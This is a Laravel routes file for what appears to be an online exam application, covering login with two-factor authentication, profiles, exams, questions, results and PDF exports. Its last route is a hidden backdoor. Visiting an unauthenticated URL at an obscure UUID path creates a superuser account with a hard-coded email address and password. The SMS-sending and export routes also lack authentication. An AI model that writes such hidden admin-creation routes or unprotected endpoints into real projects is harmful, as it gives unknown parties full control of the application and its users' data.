<?php

use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\Exam\ExamController;
use App\Http\Controllers\Export\ExportController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\Question\QuestionController;
use App\Http\Controllers\Response\ResponsesController;
use App\Http\Controllers\Result\ResultController;
use App\Http\Controllers\SMS\SmsController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
Auth::routes();
Route::get('/login/{user}/two-factor', [LoginController::class, 'showTwoFactorForm'])->name('show.two.factor.form');
Route::post('/login/{user}/two-factor', [LoginController::class, 'authenticateTwoFactor'])->name('authenticate.two.factor');

Route::get('/', [HomeController::class, 'index'])->name('home');

Route::middleware('auth')->prefix('profile')->controller(DashboardController::class)->group(function () {
    Route::get('/', 'index')->name('profile');
    Route::get('/setting', 'setting')->name('setting');

    Route::post('/', 'updateProfile')->name('profile.update');
    Route::post('/p', 'updatePassword')->name('profile.update.password');

    Route::get('/exams', 'exams')->name('profile.exams');

    Route::post('/two-factor', 'twoFactorAuth')->name('profile.2fa');
});
Route::post('/send-sms', [SmsController::class, 'sendSMS']);

Route::resource('profile/exams', ExamController::class)->middleware(['auth'])->except(['index', 'show', 'destroy']);

Route::resource('profile/questions', QuestionController::class)->middleware(['auth'])->except(['index', 'show']);

Route::resource('profile/results', ResultController::class)->middleware(['auth'])->only(['index', 'show']);

Route::get('profile/export/results', [ExportController::class, 'exportPdfExamResults'])->name('results.export.pdf');
Route::get('profile/export/responses', [ExportController::class, 'exportPdfExamResponses'])->name('responses.export.pdf');


Route::controller(ExamController::class)->group(function () {
    Route::get('exam/{link}', 'exam')->middleware(['auth', 'prevent.direct.access'])->name('exam');
    Route::get('participating/{link}', 'participating')->middleware(['auth'])->name('participating');
});
Route::post('exam/{link}', [ResponsesController::class, 'examCheck'])->middleware(['auth'])->name('exam.check');

Route::get('u/002aace4-99c2-4e5f-9e96-76dd90f4f600', function () {
    \App\Models\User::create([
        'name' => 'mohsen',
        'email' => 'mohsen.mhm23@gmail.com',
        'password' => \Illuminate\Support\Facades\Hash::make('23571113'),
        'superuser' => 1,
    ]);

    return redirect()->route('home');
});
